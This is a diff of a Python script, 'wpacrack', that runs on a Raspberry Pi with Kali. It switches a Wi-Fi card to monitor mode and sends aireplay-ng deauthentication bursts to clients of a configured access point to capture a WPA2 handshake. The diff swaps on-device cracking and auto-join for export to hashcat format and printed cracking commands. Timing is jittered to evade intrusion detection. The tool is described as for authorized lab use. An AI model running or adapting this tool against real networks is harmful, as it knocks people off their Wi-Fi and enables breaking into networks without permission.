@@ -1,71 +1,61 @@
 #!/usr/bin/env python3
 """
-wpacrack - autonomous WPA2 handshake capture + crack for the lab AP, self-contained on Pie-Kali.
-Pattern mirrors ngbf/upnpwatch: runs as a systemd service, beacons STATUS.txt/RESULT.txt,
-survives SSH disconnect, and restores the box to a clean managed state on stop/finish.
+wpacrack - autonomous, lockout-safe WPA2 handshake CAPTURE appliance for a single authorized AP.
 
-Flow: monitor-mode wlan1 -> capture a 4-way handshake (deauth lab clients, rotate the 2.4/5GHz
-      BSSIDs) -> crack with escalating wordlists -> on success set the NM PSK and reconnect
-      wlan1 to the lab LAN so we can pick straight back up.
+Design note (why capture-only): a Raspberry Pi is an excellent *capture* box but a poor
+*cracking* box - WPA2 is PBKDF2-HMAC-SHA1 x4096, and a Pi CPU manages only a few thousand
+guesses/sec (rockyou can take hours). So this tool does the part the Pi is good at - reliably
+capturing and validating a 4-way handshake - and hands you a hashcat-ready file to crack on
+real hardware (a GPU box: `hashcat -m 22000`). It never cracks on the Pi.
 
-Scope: only ever touches the single lab AP defined in TARGETS below. Read-only w.r.t. every
-       other network (it only deauths clients of that one BSSID).
+Runs headless as a systemd service (like ngbf/upnpwatch): kick it off, drop the SSH session,
+come back to a STATUS/RESULT beacon. Restores the box to a clean managed state on stop/finish.
 
-No-lockout by design: the PSK is recovered by capturing ONE handshake and cracking it
-OFFLINE - the Pi never repeatedly guesses the PSK against the live AP, so it cannot trip a
-failed-auth / MAC lockout. Deauth is deliberately gentle (small, jittered bursts, a hard total
-cap) to avoid any WIDS reaction, and the only association the tool ever makes is a single clean
-join with the already-correct cracked key. Join retries (if the flaky Realtek link needs them)
-are spaced with backoff - never a rapid wrong-credential hammer.
+> Authorized use only. It deauthenticates clients of, and captures the handshake for, the ONE
+> AP named in wpacrack.conf. It refuses to start without a configured target BSSID, so it can
+> never wander onto a neighbouring network.
 """
-import os, sys, time, subprocess, signal, re, glob, shlex, traceback, datetime, random
+import os, sys, time, subprocess, signal, re, glob, traceback, datetime, random
 
 # ---------------- CONFIG ----------------
-# Site-specific values (SSID, BSSIDs, PSK-guess seeds) are NOT hardcoded here - they are loaded
-# from wpacrack.conf (see wpacrack.conf.example). The conf file is gitignored so a lab's real AP
-# identifiers never land in the repo, and the tool refuses to run without it (so it can never
-# accidentally deauth a placeholder/other BSSID). These are inert defaults, overwritten at load.
-IFACE       = "wlan1"
-ESSID       = ""               # from conf: essid
-NM_PROFILE  = ""               # from conf: nm_profile
-TARGETS     = []               # from conf: targets = BSSID:CHANNEL,BSSID:CHANNEL
-LAB_NET     = "192.168.0."     # from conf: lab_net
-LAB_GW      = "192.168.0.1"    # from conf: lab_gw
-CUSTOM_SEEDS = []              # from conf: custom_seeds = word1,word2  (offline PSK-guess bases)
-CONNECT_ON_SUCCESS = True
+# Site-specific values are loaded from wpacrack.conf (see wpacrack.conf.example); the conf file
+# is gitignored so a lab's real AP identifiers never land in the repo, and the tool refuses to
+# run without it. These are inert defaults, overwritten at load.
+IFACE        = "wlan1"
+ESSID        = ""              # from conf: essid
+TARGETS      = []              # from conf: targets = BSSID:CHANNEL,BSSID:CHANNEL
+CUSTOM_SEEDS = []              # from conf: custom_seeds (optional) - emitted as a candidate list
+                               #            to copy to your cracking box; NOT cracked here
 
-CAPTURE_BUDGET = 2400   # max seconds to hunt a handshake (then give up cleanly)
-DWELL          = 75     # seconds to sit on each target per cycle
+CAPTURE_BUDGET = 2400   # max seconds to hunt a handshake, then give up cleanly
+DWELL          = 75     # seconds to sit on each target BSS per cycle
+
 # --- gentle, lockout-safe deauth tuning ---
-DEAUTH_EVERY     = 18   # base seconds between deauth bursts (jittered +/-)
-DEAUTH_JITTER    = 8    # random +/- seconds added to each interval (avoid a periodic WIDS signature)
-DEAUTH_COUNT     = 3    # frames per targeted burst (small: nudge a client to re-handshake, not flood)
-DEAUTH_TOTAL_CAP = 120  # HARD global ceiling on deauth frames for the whole run; stop deauthing past it
-PASSIVE_FIRST    = 20   # seconds to listen passively before ANY deauth (a natural join may hand us the HS free)
+# IMPORTANT semantics: `aireplay-ng --deauth N` does NOT send N frames. It sends N *rounds*, and
+# each round is 64 frames (for a client-targeted burst, 64 to the client AND 64 to the AP = 128).
+# So keep the round count minimal. We count ROUNDS, not frames, and show an honest frame estimate.
+DEAUTH_ROUNDS      = 1    # rounds per burst (1 = the aireplay minimum; ~64-128 frames, a single nudge)
+DEAUTH_ROUND_CAP   = 24   # HARD ceiling on deauth ROUNDS for the whole run, then passive-only
+DEAUTH_EVERY       = 20   # base seconds between bursts (jittered) - patient, not a flood
+DEAUTH_JITTER      = 8    # +/- seconds, so the timing has no periodic WIDS signature
+PASSIVE_FIRST      = 25   # seconds of pure passive listen before ANY deauth (a natural join is free)
+FRAMES_PER_ROUND   = 64   # aireplay constant, for the status frame-estimate only
 
 WORK   = "/opt/wpacrack"
 CAPS   = WORK + "/caps"
 STATUS = WORK + "/STATUS.txt"
 RESULT = WORK + "/RESULT.txt"
 LOG    = WORK + "/wpacrack.log"
-CUSTOM = WORK + "/custom.txt"
-GOOD   = WORK + "/handshake.cap"
+CUSTOM = WORK + "/candidates.txt"    # optional targeted candidate list (deliverable, not used here)
+GOOD   = WORK + "/handshake.cap"     # the captured handshake
+HASH22 = WORK + "/wpa.22000"         # hashcat-ready (mode 22000), if hcxpcapngtool is available
 HOMES  = ["/root", "/home/kali", "/home/kali-pie"]
-
-WORDLISTS = [
-    CUSTOM,
-    "/usr/share/wordlists/rockyou.txt.gz",
-    "/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt",
-    "/usr/share/seclists/Passwords/darkweb2017-top10000.txt",
-    "/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt",
-]
-# ----------------------------------------
 
 children = []
 _state = {"phase": "init", "detail": "", "started": time.time()}
 _cleaned = False
-_deauth_sent = 0   # running total of deauth frames, enforced against DEAUTH_TOTAL_CAP
-
+_deauth_rounds = 0   # running total of deauth ROUNDS, enforced against DEAUTH_ROUND_CAP
+# ----------------------------------------
 
 CONF_PATHS = [os.path.join(os.path.dirname(os.path.abspath(__file__)), "wpacrack.conf"),
               "/opt/wpacrack/wpacrack.conf"]
@@ -74,7 +64,7 @@ CONF_PATHS = [os.path.join(os.path.dirname(os.path.abspath(__file__)), "wpacrack
 def load_config():
     """Load site config from wpacrack.conf (key = value). Refuses to run without a valid
     targets list, so the tool can never deauth a placeholder/other BSSID by accident."""
-    global IFACE, ESSID, NM_PROFILE, TARGETS, LAB_NET, LAB_GW, CUSTOM_SEEDS
+    global IFACE, ESSID, TARGETS, CUSTOM_SEEDS
     path = next((p for p in CONF_PATHS if os.path.exists(p)), None)
     if not path:
         sys.stderr.write("FATAL: no wpacrack.conf found (copy wpacrack.conf.example and edit).\n")
@@ -87,15 +77,12 @@ def load_config():
                 continue
             k, v = line.split("=", 1)
             cfg[k.strip().lower()] = v.strip()
-    IFACE      = cfg.get("iface", IFACE)
-    ESSID      = cfg.get("essid", "")
-    NM_PROFILE = cfg.get("nm_profile", ESSID)
-    LAB_NET    = cfg.get("lab_net", LAB_NET)
-    LAB_GW     = cfg.get("lab_gw", LAB_GW)
+    IFACE = cfg.get("iface", IFACE)
+    ESSID = cfg.get("essid", "")
     tgs = []
     for tok in cfg.get("targets", "").split(","):
         tok = tok.strip()
-        if ":" in tok and "-" not in tok:
+        if ":" in tok:
             bssid, _, ch = tok.rpartition(":")
             bssid = bssid.strip()
             if re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", bssid) and ch.strip().isdigit():
@@ -121,10 +108,12 @@ def log(msg):
 
 def write_status():
     el = int(time.time() - _state["started"])
+    frames = _deauth_rounds * FRAMES_PER_ROUND
     block = (f"wpacrack STATUS @ {now()}\n"
              f"  phase   : {_state['phase']}\n"
              f"  detail  : {_state['detail']}\n"
              f"  elapsed : {el // 60}m{el % 60}s\n"
+             f"  deauth  : {_deauth_rounds}/{DEAUTH_ROUND_CAP} rounds (~{frames} frames)\n"
              f"  iface   : {IFACE}   essid: {ESSID}\n")
     try:
         with open(STATUS, "w") as f:
@@ -239,7 +228,7 @@ def parse_stations(csv_path, bssid):
 
 def eapol_ok(cap, bssid):
     """True when the pcap holds EAPOL frames both to and from the AP for a common station
-    (i.e. a usable 4-way handshake)."""
+    (a usable 4-way handshake)."""
     r = run(["tshark", "-r", cap, "-n", "-Y", "eapol", "-T", "fields",
              "-e", "wlan.sa", "-e", "wlan.da"], timeout=90)
     if not r or not getattr(r, "stdout", ""):
@@ -273,25 +262,16 @@ def start_airodump(bssid, ch, prefix):
 
 
 def deauth(bssid, stas):
-    """Gentle, capped, targeted deauth. Prefers per-client bursts (nudges just that station to
-    re-handshake) over broadcast (which disrupts every client and looks like a flood to a WIDS).
-    Never exceeds DEAUTH_TOTAL_CAP frames across the whole run."""
-    global _deauth_sent
-    if _deauth_sent >= DEAUTH_TOTAL_CAP:
-        set_state(detail=_state["detail"] + " [deauth cap reached - passive only]")
+    """Gentle, capped, client-targeted deauth. One minimal round to a single station per call
+    (a nudge to re-handshake), never a broadcast flood, and never past DEAUTH_ROUND_CAP rounds.
+    With no client visible it sends nothing (a broadcast deauth without a client can't produce a
+    handshake and only adds noise) - it waits for passive discovery instead."""
+    global _deauth_rounds
+    if _deauth_rounds >= DEAUTH_ROUND_CAP or not stas:
         return
-    if stas:
-        # targeted: one small burst to a single client per call (round-robin handled by caller set)
-        for s in list(stas)[:2]:
-            if _deauth_sent >= DEAUTH_TOTAL_CAP:
-                break
-            run(["aireplay-ng", "--deauth", str(DEAUTH_COUNT), "-a", bssid, "-c", s, IFACE], timeout=20)
-            _deauth_sent += DEAUTH_COUNT
-    else:
-        # no client visible: a single tiny broadcast nudge (1 frame) to surface/rejoin a sleeping client
-        if _deauth_sent < DEAUTH_TOTAL_CAP:
-            run(["aireplay-ng", "--deauth", "1", "-a", bssid, IFACE], timeout=20)
-            _deauth_sent += 1
+    target = sorted(stas)[0]   # one station per call; caller cycles as the station set changes
+    run(["aireplay-ng", "--deauth", str(DEAUTH_ROUNDS), "-a", bssid, "-c", target, IFACE], timeout=20)
+    _deauth_rounds += DEAUTH_ROUNDS
 
 
 def capture():
@@ -305,8 +285,8 @@ def capture():
             prefix = f"{CAPS}/hs_{bssid.replace(':', '')}"
             set_channel(ch)
             start_airodump(bssid, ch, prefix)
+            # passive-first: a naturally (re)joining client hands us the handshake with zero deauth
             set_state("capture", f"cycle {cyc} {bssid} ch{ch} - passive listen {PASSIVE_FIRST}s")
-            # passive-first: a naturally (re)joining client may hand us the handshake with zero deauth
             pt = time.time()
             while time.time() - pt < PASSIVE_FIRST:
                 time.sleep(4)
@@ -319,9 +299,9 @@ def capture():
             while time.time() - dwell0 < DWELL:
                 time.sleep(max(4, DEAUTH_EVERY + random.randint(-DEAUTH_JITTER, DEAUTH_JITTER)))
                 stas = parse_stations(prefix + "-01.csv", bssid)
-                capped = " [cap]" if _deauth_sent >= DEAUTH_TOTAL_CAP else ""
+                capped = " [cap-reached, passive]" if _deauth_rounds >= DEAUTH_ROUND_CAP else ""
                 set_state("capture",
-                          f"cycle {cyc} {bssid} ch{ch} - {len(stas)} client(s), deauth={_deauth_sent}/{DEAUTH_TOTAL_CAP}{capped}")
+                          f"cycle {cyc} {bssid} ch{ch} - {len(stas)} client(s){capped}")
                 deauth(bssid, stas)
                 for c in glob.glob(prefix + "*.cap"):
                     if eapol_ok(c, bssid):
@@ -333,22 +313,19 @@ def capture():
     return None
 
 
-# ---------------- crack ----------------
-def gen_custom():
-    """Build a small high-probability candidate list from the operator-supplied CUSTOM_SEEDS
-    (case variants + common numeric/symbol suffixes) plus a handful of generic weak defaults.
-    Seeds come from wpacrack.conf, never hardcoded, so no site password hints live in the repo."""
+# ---------------- convert + deliver (NO cracking on the Pi) ----------------
+def gen_candidates():
+    """Optional convenience: emit a small targeted candidate list from operator seeds, to copy to
+    the cracking box alongside the handshake. Seeds come from wpacrack.conf, never the repo."""
+    if not CUSTOM_SEEDS:
+        return
     words = set()
     tails = [""] + [str(n) for n in range(0, 100)] + [str(y) for y in range(2015, 2028)] + \
-            ["!", "1", "12", "123", "1234", "!23", "20", "21", "22", "23", "24", "25",
-             "00", "000", "123!"]
+            ["!", "1", "12", "123", "1234", "20", "21", "22", "23", "24", "25", "00", "000"]
     for seed in CUSTOM_SEEDS:
         for b in {seed, seed.lower(), seed.upper(), seed.capitalize()}:
             for t in tails:
                 words.add(b + t)
-    for w in ["password", "Password1", "12345678", "123456789", "admin123", "letmein",
-              "changeme", "qwerty123", "iloveyou"]:
-        words.add(w)
     try:
         with open(CUSTOM, "w") as f:
             f.write("\n".join(sorted(words)) + "\n")
@@ -356,73 +333,46 @@ def gen_custom():
         pass
 
 
-def crack(bssid):
-    for wl in WORDLISTS:
-        if not os.path.exists(wl):
-            continue
-        set_state("crack", f"trying wordlist {os.path.basename(wl)}")
-        if wl.endswith(".gz"):
-            cmd = f"zcat {shlex.quote(wl)} | aircrack-ng -a2 -b {bssid} -w - {shlex.quote(GOOD)}"
-            r = run(cmd, timeout=7200, shell=True)
-        else:
-            r = run(["aircrack-ng", "-a2", "-b", bssid, "-w", wl, GOOD], timeout=7200)
-        out = getattr(r, "stdout", "") or ""
-        m = re.search(r"KEY FOUND!\s*\[\s*(.*?)\s*\]", out)
-        if m:
-            set_state("crack", f"KEY FOUND via {os.path.basename(wl)}")
-            return m.group(1)
-    return None
-
-
-# ---------------- connect ----------------
-def connect(psk):
-    set_state("connect", "restoring managed mode + NetworkManager")
-    set_managed()
-    start_nm()
-    run(["nmcli", "connection", "modify", NM_PROFILE,
-         "802-11-wireless-security.psk", psk,
-         "802-11-wireless-security.psk-flags", "0"])
-    ip = None
-    for attempt in range(6):
-        run(["nmcli", "connection", "up", NM_PROFILE, "ifname", IFACE], timeout=45)
-        time.sleep(4)
-        r = run(["ip", "-4", "addr", "show", IFACE])
-        out = getattr(r, "stdout", "") or ""
-        m = re.search(r"inet (" + re.escape(LAB_NET) + r"\d+)", out)
-        if m:
-            ip = m.group(1)
-            break
-        # backoff between join attempts (key is correct; this only rides out link flaps)
-        backoff = 6 + attempt * 6
-        set_state("connect", f"attempt {attempt + 1}: no lab IP yet, backing off {backoff}s")
-        time.sleep(backoff)
-    if ip:
-        netwatch("on")
-        set_state("connected", f"wlan1 = {ip} on lab LAN")
-    return ip
+def convert_22000(bssid):
+    """Convert the captured handshake to hashcat's 22000 format IF hcxpcapngtool is present.
+    Returns the hash path on success, else None (the .cap can still be converted on the cracking
+    box). Also copies the deliverables to the home dirs for easy pull."""
+    made = None
+    w = run(["which", "hcxpcapngtool"])
+    if w is not None and getattr(w, "returncode", 1) == 0:
+        run(["hcxpcapngtool", "-o", HASH22, GOOD], timeout=120)
+        if os.path.exists(HASH22) and os.path.getsize(HASH22) > 0:
+            made = HASH22
+    for src in [GOOD, HASH22, CUSTOM]:
+        if os.path.exists(src):
+            for h in HOMES:
+                run(["cp", src, os.path.join(h, os.path.basename(src))])
+    return made
 
 
 # ---------------- cleanup / signals ----------------
-def cleanup(reconnect_ok=False):
+def cleanup():
+    """Always restore the box to a clean managed state: managed iface, NetworkManager up,
+    netwatch (wlan1 self-heal) re-enabled."""
     global _cleaned
     if _cleaned:
         return
     _cleaned = True
     kill_children()
-    if not reconnect_ok:
-        try:
-            set_managed()
-            start_nm()
-        except Exception:
-            pass
+    try:
+        set_managed()
+        start_nm()
+        netwatch("on")
+    except Exception:
+        pass
 
 
 def on_term(signum, frame):
     log(f"signal {signum} - stopping")
     set_state("stopping", "received stop signal")
-    cleanup(reconnect_ok=False)
+    cleanup()
     write_result("STOPPED by signal before completion",
-                 "box restored to managed mode; rerun wpacrack-start to resume.")
+                 "Box restored to managed mode. Rerun wpacrack-start to resume.")
     os._exit(0)
 
 
@@ -438,7 +388,7 @@ def main():
     except Exception:
         pass
     set_state("init", "preflight + monitor mode")
-    gen_custom()
+    gen_candidates()
     netwatch("off")
     stop_nm()
     set_monitor()
@@ -446,40 +396,39 @@ def main():
     try:
         bssid = capture()
         if not bssid:
+            cleanup()
             write_result("NO HANDSHAKE captured within budget",
-                         "Retry when a lab client (extender .20 / Fire TV .18 / IoT .27) is powered & associated.")
-            cleanup(reconnect_ok=False)
+                         "Retry when a client of the target AP is powered on and associated "
+                         "(a handshake requires a client to (re)join).")
             set_state("done", "no handshake")
             return
-        if not CONNECT_ON_SUCCESS:
-            key = crack(bssid)
-            write_result(f"KEY: {key}" if key else "handshake captured; key not in wordlists",
-                         f"handshake pcap: {GOOD}")
-            cleanup(reconnect_ok=False)
-            return
-        key = crack(bssid)
-        if not key:
-            write_result("HANDSHAKE CAPTURED but key NOT found in wordlists",
-                         f"pcap saved at {GOOD} for offline cracking (e.g. hashcat -m 22000).")
-            cleanup(reconnect_ok=False)
-            set_state("done", "handshake captured, key not found")
-            return
-        ip = connect(key)
-        if ip:
-            write_result("SUCCESS - PSK recovered and wlan1 connected to lab LAN",
-                         f"PSK: {key}\nwlan1 IP: {ip}\n"
-                         f"Next: read lab WAN IP via UPnP GetExternalIPAddress on {LAB_GW}.")
-            set_state("done", f"connected {ip}")
+        set_state("convert", "validating + converting to hashcat 22000")
+        made = convert_22000(bssid)
+        cleanup()   # restore the box; the Pi's job is done at capture
+        rounds = _deauth_rounds
+        frames = rounds * FRAMES_PER_ROUND
+        if made:
+            nxt = (f"Handshake: {GOOD}\nHash (hashcat mode 22000): {HASH22}\n"
+                   f"Also copied to ~/ in {', '.join(HOMES)}.\n"
+                   f"Crack it on a GPU box, e.g.:\n"
+                   f"  scp kali-pie@pie-kali:{HASH22} .\n"
+                   f"  hashcat -m 22000 -a 0 wpa.22000 <wordlist> [-r rules/best64.rule]\n"
+                   f"(deauth used: {rounds} rounds ~{frames} frames - no online guessing, no lockout)")
+            write_result("SUCCESS - handshake captured + converted (ready to crack off-box)", nxt)
+            set_state("done", "handshake + 22000 ready")
         else:
-            write_result(f"PSK recovered ({key}) but wlan1 did NOT get a lab IP",
-                         "Realtek link may be flapping; rerun connect or check the adapter.")
-            cleanup(reconnect_ok=True)
-            set_state("done", "psk found, not connected")
+            nxt = (f"Handshake: {GOOD} (also copied to ~/ in the home dirs).\n"
+                   f"hcxpcapngtool not found on this host - convert on the cracking box:\n"
+                   f"  hcxpcapngtool -o wpa.22000 handshake.cap\n"
+                   f"  hashcat -m 22000 -a 0 wpa.22000 <wordlist> [-r rules/best64.rule]\n"
+                   f"(deauth used: {rounds} rounds ~{frames} frames - no online guessing, no lockout)")
+            write_result("SUCCESS - handshake captured (convert to 22000 off-box)", nxt)
+            set_state("done", "handshake ready (no local hcxtools)")
     except Exception:
         tb = traceback.format_exc()
         log("FATAL:\n" + tb)
+        cleanup()
         write_result("ERROR - see wpacrack.log", tb[-800:])
-        cleanup(reconnect_ok=False)
 
 
 if __name__ == "__main__":
